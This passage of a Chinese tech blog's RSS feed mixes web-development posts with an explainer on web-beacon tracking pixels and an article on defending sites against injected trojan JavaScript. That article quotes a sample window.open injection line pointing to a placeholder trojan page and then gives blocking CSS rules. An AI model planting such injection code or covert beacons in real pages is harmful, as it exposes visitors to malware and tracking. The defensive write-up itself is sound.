      <guid>https://anwangtanmi.github.io/posts/21c7f2f9346629b903b647b9162a75e0/</guid>
      <description> 网络臭虫又叫 网络信标（Web beacon）, 是可以暗藏在任何&#xA;网页&#xA;元素或&#xA;邮件&#xA;内的1&#xA;像素&#xA;大小的透明&#xA;GIF&#xA;或&#xA;PNG&#xA;图片&#xA;可以理解为 网络臭虫的目的是把用户的信息上传到服务端 邮件跟踪和垃圾邮件 垃圾邮件的发送者，随机生成邮件的接受者的地址，并在邮件中埋入一个网络臭虫，网络臭虫可以是一个一像素的图片比如： 这样当有真实用户打开邮件时，会装载图片，但实际是调用这个请求到服务器端（因为像素小，看不到界面）。这样服务器端就可以根据参数部分确定这个收件人是有效的邮件，而记录这个收件人，后续就可以专门针对他发送垃圾邮件了。 这里之所以用是应为网站只要装入网页就会从服务器中获取图片信息，使用这种机制的一个抓住的漏洞是，有些论坛可以发送带html格式的内容作为跟帖，这样恶意者可以发送的跟帖子中植入一个网络臭虫，这样第三方浏览人员打开帖子并查看跟帖时将会激发网络臭虫的调用，而把浏览器的信息等一些数据传送到网络臭虫所指定的网址上去。 网络臭虫可以收集到的信息如下（HTTP请求头中的信息）： 1。第三方浏览者的IP地址， 2。第三方浏览者的浏览器类型 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0 3。&#xA;网络臭虫所在网页的网址，也就是当前浏览的页面 Referer: http://www.baidu.com/ 4.&#xA;网络臭虫被访问的时间，服务器算出 5.臭虫服务器原来保存在本地的cookie信息，在请求时会根据臭虫网址的url地址获取保存在本地的cookie信息。 6.在臭虫网址响应时还可以写入cookie到本地，这个cookie信息可以根据请求的信息来生成唯一一个标识客户端的数据，这样下次客户端再次通过别的网址访问臭虫网址时（当然另外一个网站也是植入了这个臭虫网址的）就可以上传以前访问过的信息的。 以百度广告联盟为例子， 当你在百度中搜索信息时，百度会记录你的搜索信息，同时会在你本地保存一个标识本地的cookie, 而当你打开第三方网站时，第三方网站嵌入了百度广告的JS代码，里面有请求百度广告的请求，而发这个请求时会把原来保存在本地的cookie上传给百度，而百度在服务器根据你的机器标识和你曾经的搜索来推送不同的广告给你。 </description>
    </item>
    <item>
      <title>30个漂亮的HTML5和CSS3下拉菜单</title>
      <link>https://anwangtanmi.github.io/posts/532c4330aacfae84d6d5936ccd492d8c/</link>
      <pubDate>Thu, 05 Dec 2013 17:11:31 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/532c4330aacfae84d6d5936ccd492d8c/</guid>
      <description> 一些漂亮的HTML5和CSS3下拉菜单列表。这些例子可以帮助你得到灵感。让我们一起来看看这些下拉菜单。 Dark Menu: Pure CSS3 Two Level Menu Pure CSS3 LavaLamp Menu HTML5/CSS3 Gray Navigation Menu How to Build and Enhance a 3-Level Navigation Menu CSS3 Minimalistic Navigation Menu Slide Down Box Menu with jQuery and CSS3 Create a stunning menu in CSS3 Elegant Dark CSS3 Menu Template Musical drop down menu Creating CSS3 Dropdown Menu CSS3 vertical multicolor 3D menu Creating an Accordian like CSS3 Onclick Vertical Navigation Creative CSS3 Animation Menus Mega menu with HTML5 and CSS3 Making a CSS3 Animated Menu Creating a cool CSS3 Dropdown Menu CSS3 Dropdown Menu Click action Multi-level CSS3 Dropdown Menu Creating a CSS3 Dropdown Menu Office Style CSS3 Multilevel Menu Creating a Marble Style CSS3 Navigation Menu Creating a Toggle CSS3 Bottom Navigation Bar jQuery style menu with CSS3 How to Create a Drop-down Nav Menu With HTML5, CSS3 and JQuery CSS3 navigation menu inspired HTML5 Canvas Navigation menu with Fire Collection of menu effects Another simple yet amazing dropdown menu in pure CSS3 Fanciest Dropdown Menu You Ever Saw jQuery &amp;amp; CSS Example – Dropdown Menu </description>
    </item>
    <item>
      <title>弹出div后面窗口变灰</title>
      <link>https://anwangtanmi.github.io/posts/58a01e42f93522c8dbcabb477091b247/</link>
      <pubDate>Wed, 06 Nov 2013 23:34:33 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/58a01e42f93522c8dbcabb477091b247/</guid>
      <description>当时刚工作不久,做东西的时候出现个问题,就是上传文件的时候多次点击提交按钮重复提交的问题。&#xA;现在想起来解决的办法有好多种,可是当时的确纠结的够呛。领导说写个文件上传的进度条不错,还美观,当时由于小弟底子太薄,研究了一天也没整出那个实时的文件上传进度条,&#xA;无奈之下,上网找了个类似于进度条 的功能（是假滴）。 JS弹出一个网页对话框，后面全变灰，并不可用。 JS弹出一个网页对话框，后面全变灰，并不可用。思路：一个覆盖整个页面的层，设置透明度0 测试&#xA;测试&#xA;测试&#xA;测试&#xA;测试&#xA;测试&#xA;测试&#xA;测试&#xA;测试&#xA;测试&#xA;测试&#xA;测试&#xA;测试&#xA;测试&#xA;测试</description>
    </item>
    <item>
      <title>50个高端大气上档次的管理后台界面模板</title>
      <link>https://anwangtanmi.github.io/posts/72f881ffc20c3a6952f38de92743c475/</link>
      <pubDate>Tue, 03 Sep 2013 16:12:05 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/72f881ffc20c3a6952f38de92743c475/</guid>
      <description>50个高端大气上档次的管理后台界面模板 这里收集了50个高端大气上档次，简洁时尚国际化的后台管理界面模板，希望你能喜欢并获取灵感。&#xA;1. Katniss Premium Admin Template 2. Esthetics Admin-Clean &amp;amp; Responsive Admin Template 3. Virgo – Premium Admin Template 4. Conquer – Responsive Admin Dashboard Template 5. Admindo – Responsive Admin Template 6. Pontus – A Clever Responsive Admin Template 7. Atina – Responsive Admin Template 8. BootAdmin – All-In-One Admin Responsive Template 9. Paulo Admin Template 10. The Realm – Clean &amp;amp; Modern Admin Template 11. Maruti Admin 12.</description>
    </item>
    <item>
      <title>LigerUi中Grid表记录根据条件显示不同颜色和不同内容！（实例）</title>
      <link>https://anwangtanmi.github.io/posts/02c5c9b80e64abc381758b5f2d974f35/</link>
      <pubDate>Thu, 06 Jun 2013 20:58:03 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/02c5c9b80e64abc381758b5f2d974f35/</guid>
      <description>{ display: &#34;性别&#34;, name: &#34;name&#34;, width: 130, type: &#34;text&#34;, align: &#34;left&#34;, render: function (row) { var html = row.sex == 0 ? &#34;男&#34; : &#34;女&#34;; return html; } // 一个完整代码 { display: &#34;任务名称&#34;, name: &#34;Brd_Name&#34;, width: 200, type: &#34;text&#34;, align: &#34;left&#34; , render: function (row) { // var html = &#34;&#34; + row.Brd_Name + &#34;&#34;; var html = row.Class_Class == 1 ? &#34;&#34; + row.Brd_Name + &#34;&#34; : row.Brd_Name; if (row.</description>
    </item>
    <item>
      <title>怎样防止网站被JS挂马的代码和查杀方法</title>
      <link>https://anwangtanmi.github.io/posts/9310d9a86793d4a9a79976c4e5b68acf/</link>
      <pubDate>Sat, 09 Mar 2013 12:21:16 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/9310d9a86793d4a9a79976c4e5b68acf/</guid>
      <description> JS挂马方法有两种，一种是直接将JavaScript脚本代码写在网页中，当访问者在浏览网页时，恶意的挂马脚本就会通过用户的浏览器悄悄地打开网马窗口，隐藏地运行。&#xA;这种方法使用的关键代码如下：&#xA;window.open(“http://www.123.com/木马.html”,””,”toolbar=no,location=no,directories=no,status=no,menubar=no,scro llbars=no,width=1,height=1″);&#xA;这种代码往往很长，很容易被安全工程师发现，而且没有经验的黑客也喜欢将“width”和“height=”参数设为“0”，但是设置为0后，可能会出现恶意代码不运行的情况。&#xA;另外一种JS挂马方式是，黑客先将挂马脚本代码“document.write(‘＜Iframe src=”网页木马地址” &amp;gt;&#xA;或者&#xA;document.write(“”)&#xA;document.write(“”)&#xA;document.write(“”)&#xA;就成功地将木马挂到了对方的网页中了。&#xA;小提示：黑客还可以根据情况随机变换插入的JS挂马方法，例如黑客有可能会将脚本写为：&#xA;或者：&#xA;等等……&#xA;防第一种JS挂马方式，不方便，用得非常少，而第二种JS挂马方式才是当前主流的，所以我们主要针对它进行防御。方法就是阻止Src请求的异地外域的JS脚本，代码如下：&#xA;iframe{mdy1:expression(this.src=’about:blank’,this.outerHTML=”);}&#xA;script{mzm2:expression((this.src.toLowerCase().indexOf(‘http’)==0)?document.write(‘木马被成功隔离!’):”);}&#xA;不过这种方法的缺点就是网站的访问者将不能看到被挂了JS木马的相关网页。&#xA;所以我们为安全工程师提供了一段可以中止JS脚本运行的CSS代码，这段代码会让异地外域的JS文件在使用document.write()时，被document.close()强制关闭。这个时侯JS挂马的内容往往还没有来得及写完，只有部分被强制输出了，Writer后面的内容再不会被写入访问者的电脑中，从而起到防范JS脚本挂马的作用。&#xA;让JS木马的进程迅速中止&#xA;在 之间加入如下代码:&#xA;屏蔽script和iframe&#xA;/*&amp;lt;![CDATA[*/&#xA;iframe{nhk1:expression(this.src=’about:blank’,this.outerHTML=”);}&#xA;script{ngz1:expression((this.src.indexOf(‘http’)==0)?document.close():”);}&#xA;/*]]&amp;gt;*/&#xA;单屏蔽script&#xA;/*&amp;lt;![CDATA[*/&#xA;/*iframe{nhk1:expression(this.src=’about:blank’,this.outerHTML=”);}*/&#xA;script{ngz1:expression((this.src.indexOf(‘http’)==0)?document.close():”);}&#xA;/*]]&amp;gt;*/&#xA;Post navigation Previous Post:altium中遇到的一些问题Next Post:YUV422转BGR888（海思3516平台） Recent Posts&#x9;暗网网址导航大全（2021年12月更新） 暗网网址合集 暗网链接 Deep Web Link Director 全球十大暗网搜索引擎 最详细的暗网教程——tor洋葱浏览器的安装和使用方法 最新darkweb暗网搜索引擎——Tordex | The Uncensored Tor Search Engine 顶级保密暗网网址分享 如何进入暗网？教程+工具 Tor 洋葱浏览器 如何进入暗网详细步骤（暗网网桥获取方法） 什么是“暗网”？我们该如何访问? Deep Web / Dark Web 大全 Tagsandroid (10) application (5) google (7) hacker (5) internet (5) java (7) Linux (16) network (6) qq (4) Source Code Analysis (15) tor (44) ubuntu (14) web (21) windows (9) 互联网 (7) 产品 (6) 代理服务器 (5) 信息安全 (4) 其他 (7) 区块链 (4) 存储 (4) 安全 (11) 工作 (20) 工具 (10) 手机 (9) 搜索引擎 (5) 暗网 (16) 服务器 (10) 杂项 (17) 活动 (12) 测试 (5) 浏览器 (19) 深度学习 (5) 照片 (6) 爬虫 (7) 物理学猜想 (10) 环境搭建 (3) 生活 (23) 电信 (4) 电话 (5) 百度 (4) 算法 (5) 网络 (52) 网络安全 (18) 网络安全知识 (6) Categories&#x9;AI (5) AltiumDesigner (7) BTC (6) darknet (25) Database (3) DeepLearning (78) Docker (1) GIS (9) Google (2) iOS (7) IT (7) java (37) Life (93) linux (86) LPC (11) macOS (6) mysql (5) Python (52) qt (5) SEO (2) threejs (5) Unity (19) 产品设计 (15) 人工智能 (12) 信息安全 (36) 前端 (128) 区块链 (14) 图像处理 (59) 图形视频 (36) 大数据 (15) 嵌入式 (7) 工具 (45) 开发 (57) 性能优化 (2) 技术 (18) 搜索 (10) 操作系统 (35) 教程知识 (1) 教育 (2) 数字图像处理 (3) 数据分析 (2) 数据库 (4) 数据结构 (3) 数论 (1) 显卡驱动 (1) 智能搜索技术 (3) 未分类 (496) 机器学习 (23) 模型压缩 (2) 模拟电路 (1) 模拟题 (1) 比特币 (3) 水下图像增强 (1) 测试 (4) 浏览器 (1) 深网 (2) 渗透测试 (4) 游戏 (2) 游戏开发 (16) 爬虫 (6) 环境搭建 (2) 生活 (5) 电子商务 (1) 硬件设计 (1) 社工库 (1) 神经机制 (1) 移动web (1) 移动开发 (76) 程序员 (6) 站长 (1) 算法 (9) 统计搜索 (9) 网络优化 (7) 网络安全 (80) 视觉 (4) 计算机 (31) 论文 (8) 设计 (6) 资源搜集 (1) 资讯 (34) 软件工具 (15) 软件开发 (26) 运维 (21) 逆向 (2) 项目管理 (4) Archives&#x9;December 2021 (1) August 2021 (8) April 2020 (4) March 2020 (63) February 2020 (154) January 2020 (134) December 2019 (14) November 2019 (25) October 2019 (27) September 2019 (43) August 2019 (32) July 2019 (51) June 2019 (49) May 2019 (65) April 2019 (64) March 2019 (97) February 2019 (49) January 2019 (78) December 2018 (70) November 2018 (69) October 2018 (31) September 2018 (73) August 2018 (109) July 2018 (70) June 2018 (58) May 2018 (51) April 2018 (52) March 2018 (52) February 2018 (19) January 2018 (25) December 2017 (39) November 2017 (31) October 2017 (26) September 2017 (42) August 2017 (46) July 2017 (50) June 2017 (71) May 2017 (32) April 2017 (29) March 2017 (36) February 2017 (18) January 2017 (25) December 2016 (20) November 2016 (17) October 2016 (19) September 2016 (14) August 2016 (23) July 2016 (26) June 2016 (15) May 2016 (11) April 2016 (21) March 2016 (18) February 2016 (21) January 2016 (14) December 2015 (13) November 2015 (13) October 2015 (6) September 2015 (7) August 2015 (12) July 2015 (11) June 2015 (3) May 2015 (9) April 2015 (12) March 2015 (7) February 2015 (10) January 2015 (10) December 2014 (14) November 2014 (6) October 2014 (10) September 2014 (6) August 2014 (10) July 2014 (11) June 2014 (6) May 2014 (9) April 2014 (6) March 2014 (5) February 2014 (3) January 2014 (3) December 2013 (12) November 2013 (7) October 2013 (6) September 2013 (7) August 2013 (4) July 2013 (5) June 2013 (6) May 2013 (28) April 2013 (17) March 2013 (4) February 2013 (2) January 2013 (6) December 2012 (6) November 2012 (4) October 2012 (6) September 2012 (6) August 2012 (4) July 2012 (8) June 2012 (5) May 2012 (8) April 2012 (15) March 2012 (5) February 2012 (2) January 2012 (3) December 2011 (9) November 2011 (4) October 2011 (1) September 2011 (4) August 2011 (4) July 2011 (4) June 2011 (4) May 2011 (6) April 2011 (2) March 2011 (4) February 2011 (2) January 2011 (3) December 2010 (6) November 2010 (6) October 2010 (5) September 2010 (8) August 2010 (8) July 2010 (7) June 2010 (3) May 2010 (14) April 2010 (7) February 2010 (4) January 2010 (11) December 2009 (8) November 2009 (3) October 2009 (5) September 2009 (4) July 2009 (7) April 2009 (5) March 2009 (5) February 2009 (3) January 2009 (3) December 2008 (5) November 2008 (5) October 2008 (3) September 2008 (3) August 2008 (2) July 2008 (5) June 2008 (6) May 2008 (9) April 2008 (4) March 2008 (5) February 2008 (4) January 2008 (3) December 2007 (6) November 2007 (3) October 2007 (1) September 2007 (5) August 2007 (2) July 2007 (3) June 2007 (3) May 2007 (1) April 2007 (1) March 2007 (2) February 2007 (2) January 2007 (3) December 2006 (1) November 2006 (3) September 2006 (3) July 2006 (1) June 2006 (3) May 2006 (3) April 2006 (1) March 2006 (2) February 2006 (3) January 2006 (1) December 2005 (2) November 2005 (1) September 2005 (1) August 2005 (1) July 2005 (2) April 2005 (2) March 2005 (3) February 2005 (2) January 2005 (2) December 2004 (2) November 2004 (4) September 2004 (2) August 2004 (2) July 2004 (2) September 2003 (1) May 2002 (1) March 2002 (1) </description>
    </item>
    <item>
      <title>真实感渲染之Tone Mapping</title>
      <link>https://anwangtanmi.github.io/posts/0164c4151c5cdceebeff1a96015d3d8d/</link>
      <pubDate>Sat, 17 Nov 2012 15:04:18 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/0164c4151c5cdceebeff1a96015d3d8d/</guid>
      <description>Rendering in Computer Graphic水太深，慢慢学习ING…&#xA;好的效果是最有说服力的：&#xA;以下内容转载自网络，Just search it：&#xA;Tone Mapping原是摄影学中的一个术语，因为打印相片所能表现的亮度范围不足以表现现实世界中的亮度域，而如果简单的将真实世界的整个亮度域线性压缩到照片所能表现的亮度域内，则会在明暗两端同时丢失很多细节，这显然不是所希望的效果，Tone Mapping就是为了克服这一情况而存在的，既然相片所能呈现的亮度域有限则我们可以根据所拍摄场景内的整体亮度通过光圈与曝光时间的长短来控制一个合适的亮度域，这样既保证细节不丢失，也可以不使照片失真。人的眼睛也是相同的原理，这就是为什么当我们从一个明亮的环境突然到一个黑暗的环境时，可以从什么都看不见到慢慢可以适应周围的亮度，所不同的是人眼是通过瞳孔来调节亮度域的。&#xA;而这个问题同样存在在计算机图形上，为了让图像更真实的显示在显示器上，同样需要Tone Mapping来辅助。&#xA;整个Tone Mapping的过程就是首先要根据当前的场景推算出场景的平均亮度，再根据这个平均亮度选取一个合适的亮度域，再将整个场景映射到这个亮度域得到正确的结果。其中最重要的几个参数：&#xA;Middle grey：整个场景的平均灰度，关系到场景所应处在亮度域。&#xA;Key：场景的Key将决定整个场景的亮度倾向，倾向偏亮亦或是偏暗。&#xA;首先我们需要做的是计算出整个场景的平均亮度，有很多种计算平均亮度的方法，目前常用的的是使用log-average亮度来作为场景的平均亮度，通过下面的公式可以计算得到：&#xA;其中Lw(x,y)是像素点x,y的亮度，N是场景内的像素数，δ是一个很小的数用来应对像素点纯黑的情况。&#xA;上面的公式用来映射亮度域，α即是前面所讲的Key值，用来控制场景的亮度倾向，一般来说，会使用几个特定的值，0.18是一个适中的Key，0.36或者0.72相对偏亮，0.09甚至0.045则是偏暗。完成映射的场景为了满足计算机能显示的范围还要将亮度范围再映射到[0,1]区间，可以通过下面的公式简单的得到[0,1]区间的亮度。&#xA;不过这样得到的结果并不总是令人满意的，所以一般扩展为如下面的公式，公式中的参数Lwhite用来控制场景中的曝光，凡是亮度超过Lwhite的像素都会被置为纯白。如果Lwhite的值非常大，则这个参数在公式中将不起任何作用，如果非常小则场景将变为几乎全白。Ld即为我们所要的映射后的x,y像素点的亮度值。&#xA;Tone Mapping一般作为HDR算法中的一部分存在，在使用中会灵活很多，但基本的原理都是相同的。</description>
    </item>
    <item>
      <title>22个完美设计的 PSD 登录表单模板免费下载！</title>
      <link>https://anwangtanmi.github.io/posts/5b4fdd9a6f20234e3068155bc2215fa4/</link>
      <pubDate>Mon, 03 Sep 2012 13:30:36 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/5b4fdd9a6f20234e3068155bc2215fa4/</guid>
      <description>在网页设计过程中，如果有现成的 PSD 素材可以使用，那么可以事半功倍。作为网站不可或缺的部分，登录表单的设计经常都让设计师们头疼。今天这篇文章和大家分享的22个完美设计的 PSD 登录表单模板能够帮上设计师们的大忙，可以从这些优秀的设计中获取灵感，也可以直接下载使用。&#xA;Login Modal Window PSD&#xA;Log in/Sign in Form&#xA;Dark Login Box&#xA;Secure Login form PSD&#xA;Login Page free PSD Template&#xA;Login modal box&#xA;Pretty clean login form&#xA;PSD Login forms&#xA;Blue login box&#xA;Account Login Panel (PSD)&#xA;Fresh WordPress Login Form Set&#xA;Clean Log In Form PSD&#xA;Classic Login Page (PSD)&#xA;Vintage Sign Up Form&#xA;FREE AND AWESOME LOGIN BOX TEMPLATE [PSD]&#xA;Minimal Login User Interface</description>
    </item>
    <item>
      <title>5 Good Image Search Engines Apart From Google Image Search</title>
      <link>https://anwangtanmi.github.io/posts/a2e1ab48d09a18e4a169761978627095/</link>
      <pubDate>Sat, 31 Oct 2009 15:20:02 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/a2e1ab48d09a18e4a169761978627095/</guid>
      <description>When the right picture is everything, you need to go deep into the web and comb through the millions that are out there. Image search is just like normal search and similarly painstaking. Making it less so are the dedicated image search engines. Image search engines sift through the web searching by type of image, by license or by tags and keywords. There are of course, standalone photo reservoirs like Flickr, Stock.</description>
    </item>
    <item>
      <title>Flex Deep Link(History Manager)</title>
      <link>https://anwangtanmi.github.io/posts/2551776fe0f2c4519df2f5dec90bb04b/</link>
      <pubDate>Wed, 23 Sep 2009 09:19:10 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/2551776fe0f2c4519df2f5dec90bb04b/</guid>
      <description>最近做flex项目的时候，发现退出登陆时URL上会自动加上一个“#”字符，很奇怪，Google+Baidu无数次都没有找到答案。今天无意间看到几 个群友在说通过“BrowserManager”获取URL，于是仔细查看了API，又发现了“HistoryManager”，这个问题终于明白了。&#xA;我 们通常看的Web页面 可以通过浏览器的“前进”“后退”来查看刚才看过的页面，同样，嵌入的页面中的flash也可以实现这样的功能。方法是通过 HistoryManageer类和BrowserManager类两种方法来实现。HistoryManageer类主要是用在Flex2，Flex3 后很少用了。待会我将分别介绍这两种方法。&#xA;回到刚才说URL上自动加“#”号的问题：原因是Application 默认historyManagementEnabled属性是ture，也就是说HistoryManageer类功能自动开启 了，Application 里面通过程序控制addChild或removeChild任何组件所导致的变化，将会记录在flash的history中，导致重写url，加上“#” 字符。故有了这个奇怪的“#”号。在Flex3中，HistoryManager功能在Flex项目中默认打开的还有Accordion 和 TabNavigator组件。对于没有默认打开该功能的组件，如果要实现该功能，则需要另外注册。下面引用两片文章加以说明：&#xA;对于一个网站来说，其是有若干个网页组成的。而各个网页之间的链接叫做超链接。链接成为网页和网页之间的桥梁。那么，对于一个Flash整站来说，有没有 一个办法来实现 Flash各页面（更恰当的说是各功能模块）之间的链接呢。比如，我想在浏览器中输入一个链接便可以链到Flash整站中的一页—一个功能模块，而不是每 次都要通过Flash整站的第一个页面的功能导航进入。把Flash的各个功能块页面化，那么我们该怎么实现呢。到底能不能实现呢？&#xA;答案是肯定的，通过Flex Deep Link 便能实现上述功能。&#xA;Flex Deep Link(深链接)-第一，Deep Link 简介。&#xA;Deep Link其实也是依赖Flash和浏览器的交互来实现的，通过获取链接地址中#后面的参数来实现页面标记，当你在Flex Bulid3发布一个项目时，其会自动你发布的目录生成一个名为History的文件夹，里面有 History.js,HistoryFrame.html,history.css这三个文件，可见Deep Link也是通过和浏览器交互来实现的.如果浏览器不支持JavaScript或者禁用JavaScript，那么Deep LinK肯定是不能用的。&#xA;对于Deep Link应用，最重要的就是学会应用BrowserManager和HistoryManager这两个类。我们由简单到困难，先讲一讲HistoryManager这个类的应用。&#xA;Flex Deep Link(深链接)- 第二，HistoryManager。 HistoryManager功能在Flex项目中是默认打开的，比如在使用Accordion 和 TabNavigator组件时，在不同区域切换时，Flex会自动记录下各个状态，我们可以通过点击浏览器的“前进”和“后退”按钮来前进和倒退，在你 切换这些组件的区域时，Flex会自动你在网页链接的后面加写参数，以便记录当前页面的状态。&#xA;默认情况下HistoryManager的功能是打开的，你可以通过设置各个组件或Application的historyManagementEnabled属性为false（默认为TRUE）来关闭此功能。&#xA;这些都没什么好讲的。关键是怎么在一些普通组建上使用HistoryManager功能，默认的navigator container组建都是支持该功能的。要使一些普通组建也支持此功能，必须：&#xA;1.实现mx.managers.IHistoryManagerClient接口。&#xA;2.用HistoryManager’的register()方法为组建注册。&#xA;3.当组件状态改变时保存组件的状态。&#xA;4.通过实施IHistoryManagerClient的saveState() 和 loadState()方法来保存和读取组件状态。&#xA;拿CheckBox为例：&#xA;xmlns:mx=”http://www.adobe.com/2006/mxml”&#xA;label=”Check me” implements=”mx.managers.IHistoryManagerClient” //关键步骤1，实现接口&#xA;creationComplete=”mx.managers.HistoryManager.register(this);”//关键步骤2，注册组件&#xA;change=”boxChanged(event)”//关键步骤3，当组件发生变化时保存状态&#xA;&amp;gt;&#xA;if (newState != selected) {&#xA;selected = newState;</description>
    </item>
    <item>
      <title>javascript实现下拉列表框模糊查询</title>
      <link>https://anwangtanmi.github.io/posts/119fe3950b2d4c3ba7c62b4c3799603a/</link>
      <pubDate>Mon, 20 Jul 2009 08:55:00 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/119fe3950b2d4c3ba7c62b4c3799603a/</guid>
      <description>var strGB=”啊阿埃挨哎唉哀皑癌蔼矮艾碍爱隘鞍氨安俺按暗岸胺案肮昂盎凹敖熬翱袄傲奥懊澳芭捌扒叭吧笆八疤巴拔跋靶把耙坝霸罢爸白柏百摆佰败拜稗斑班搬扳般颁板版扮拌伴瓣半办绊邦帮梆榜膀绑棒磅蚌镑傍谤苞胞包褒剥薄雹保堡饱宝抱报暴豹鲍爆杯碑悲卑北辈背贝钡倍狈备惫焙被奔苯本笨崩绷甭泵蹦迸逼鼻比鄙笔彼碧蓖蔽毕毙毖币庇痹闭敝弊必辟壁臂避陛鞭边编贬扁便变卞辨辩辫遍标彪膘表鳖憋别瘪彬斌濒滨宾摈兵冰柄丙秉饼炳病并玻菠播拨钵波博勃搏铂箔伯帛舶脖膊渤泊驳捕卜哺补埠不布步簿部怖擦猜裁材才财睬踩采彩菜蔡餐参蚕残惭惨灿苍舱仓沧藏操糙槽曹草厕策侧册测层蹭插叉茬茶查碴搽察岔差诧拆柴豺搀掺蝉馋谗缠铲产阐颤昌猖场尝常长偿肠厂敞畅唱倡超抄钞朝嘲潮巢吵炒车扯撤掣彻澈郴臣辰尘晨忱沉陈趁衬撑称城橙成呈乘程惩澄诚承逞骋秤吃痴持匙池迟弛驰耻齿侈尺赤翅斥炽充冲虫崇宠抽酬畴踌稠愁筹仇绸瞅丑臭初出橱厨躇锄雏滁除楚础储矗搐触处揣川穿椽传船喘串疮窗幢床闯创吹炊捶锤垂春椿醇唇淳纯蠢戳绰疵茨磁雌辞慈瓷词此刺赐次聪葱囱匆从丛凑粗醋簇促蹿篡窜摧崔催脆瘁粹淬翠村存寸磋撮搓措挫错搭达答瘩打大呆歹傣戴带殆代贷袋待逮怠耽担丹单郸掸胆旦氮但惮淡诞弹蛋当挡党荡档刀捣蹈倒岛祷导到稻悼道盗德得的蹬灯登等瞪凳邓堤低滴迪敌笛狄涤翟嫡抵底地蒂第帝弟递缔颠掂滇碘点典靛垫电佃甸店惦奠淀殿碉叼雕凋刁掉吊钓调跌爹碟蝶迭谍叠丁盯叮钉顶鼎锭定订丢东冬董懂动栋侗恫冻洞兜抖斗陡豆逗痘都督毒犊独读堵睹赌杜镀肚度渡妒端短锻段断缎堆兑队对墩吨蹲敦顿囤钝盾遁掇哆多夺垛躲朵跺舵剁惰堕蛾峨鹅俄额讹娥恶厄扼遏鄂饿恩而儿耳尔饵洱二贰发罚筏伐乏阀法珐藩帆番翻樊矾钒繁凡烦反返范贩犯饭泛坊芳方肪房防妨仿访纺放菲非啡飞肥匪诽吠肺废沸费芬酚吩氛分纷坟焚汾粉奋份忿愤粪丰封枫蜂峰锋风疯烽逢冯缝讽奉凤佛否夫敷肤孵扶拂辐幅氟符伏俘服浮涪福袱弗甫抚辅俯釜斧脯腑府腐赴副覆赋复傅付阜父腹负富讣附妇缚咐噶嘎该改概钙盖溉干甘杆柑竿肝赶感秆敢赣冈刚钢缸肛纲岗港杠篙皋高膏羔糕搞镐稿告哥歌搁戈鸽胳疙割革葛格蛤阁隔铬个各给根跟耕更庚羹埂耿梗工攻功恭龚供躬公宫弓巩汞拱贡共钩勾沟苟狗垢构购够辜菇咕箍估沽孤姑鼓古蛊骨谷股故顾固雇刮瓜剐寡挂褂乖拐怪棺关官冠观管馆罐惯灌贯光广逛瑰规圭硅归龟闺轨鬼诡癸桂柜跪贵刽辊滚棍锅郭国果裹过哈骸孩海氦亥害骇酣憨邯韩含涵寒函喊罕翰撼捍旱憾悍焊汗汉夯杭航壕嚎豪毫郝好耗号浩呵喝荷菏核禾和何合盒貉阂河涸赫褐鹤贺嘿黑痕很狠恨哼亨横衡恒轰哄烘虹鸿洪宏弘红喉侯猴吼厚候后呼乎忽瑚壶葫胡蝴狐糊湖弧虎唬护互沪户花哗华猾滑画划化话槐徊怀淮坏欢环桓还缓换患唤痪豢焕涣宦幻荒慌黄磺蝗簧皇凰惶煌晃幌恍谎灰挥辉徽恢蛔回毁悔慧卉惠晦贿秽会烩汇讳诲绘荤昏婚魂浑混豁活伙火获或惑霍货祸击圾基机畸稽积箕肌饥迹激讥鸡姬绩缉吉极棘辑籍集及急疾汲即嫉级挤几脊己蓟技冀季伎祭剂悸济寄寂计记既忌际妓继纪嘉枷夹佳家加荚颊贾甲钾假稼价架驾嫁歼监坚尖笺间煎兼肩艰奸缄茧检柬碱硷拣捡简俭剪减荐槛鉴践贱见键箭件健舰剑饯渐溅涧建僵姜将浆江疆蒋桨奖讲匠酱降蕉椒礁焦胶交郊浇骄娇嚼搅铰矫侥脚狡角饺缴绞剿教酵轿较叫窖揭接皆秸街阶截劫节桔杰捷睫竭洁结解姐戒藉芥界借介疥诫届巾筋斤金今津襟紧锦仅谨进靳晋禁近烬浸尽劲荆兢茎睛晶鲸京惊精粳经井警景颈静境敬镜径痉靖竟竞净炯窘揪究纠玖韭久灸九酒厩救旧臼舅咎就疚鞠拘狙疽居驹菊局咀矩举沮聚拒据巨具距踞锯俱句惧炬剧捐鹃娟倦眷卷绢撅攫抉掘倔爵觉决诀绝均菌钧军君峻俊竣浚郡骏喀咖卡咯开揩楷凯慨刊堪勘坎砍看康慷糠扛抗亢炕考拷烤靠坷苛柯棵磕颗科壳咳可渴克刻客课肯啃垦恳坑吭空恐孔控抠口扣寇枯哭窟苦酷库裤夸垮挎跨胯块筷侩快宽款匡筐狂框矿眶旷况亏盔岿窥葵奎魁傀馈愧溃坤昆捆困括扩廓阔垃拉喇蜡腊辣啦莱来赖蓝婪栏拦篮阑兰澜谰揽览懒缆烂滥琅榔狼廊郎朗浪捞劳牢老佬姥酪烙涝勒乐雷镭蕾磊累儡垒擂肋类泪棱楞冷厘梨犁黎篱狸离漓理李里鲤礼莉荔吏栗丽厉励砾历利傈例俐痢立粒沥隶力璃哩俩联莲连镰廉怜涟帘敛脸链恋炼练粮凉梁粱良两辆量晾亮谅撩聊僚疗燎寥辽潦了撂镣廖料列裂烈劣猎琳林磷霖临邻鳞淋凛赁吝拎玲菱零龄铃伶羚凌灵陵岭领另令溜琉榴硫馏留刘瘤流柳六龙聋咙笼窿隆垄拢陇楼娄搂篓漏陋芦卢颅庐炉掳卤虏鲁麓碌露路赂鹿潞禄录陆戮驴吕铝侣旅履屡缕虑氯律率滤绿峦挛孪滦卵乱掠略抡轮伦仑沦纶论萝螺罗逻锣箩骡裸落洛骆络妈麻玛码蚂马骂嘛吗埋买麦卖迈脉瞒馒蛮满蔓曼慢漫谩芒茫盲氓忙莽猫茅锚毛矛铆卯茂冒帽貌贸么玫枚梅酶霉煤没眉媒镁每美昧寐妹媚门闷们萌蒙檬盟锰猛梦孟眯醚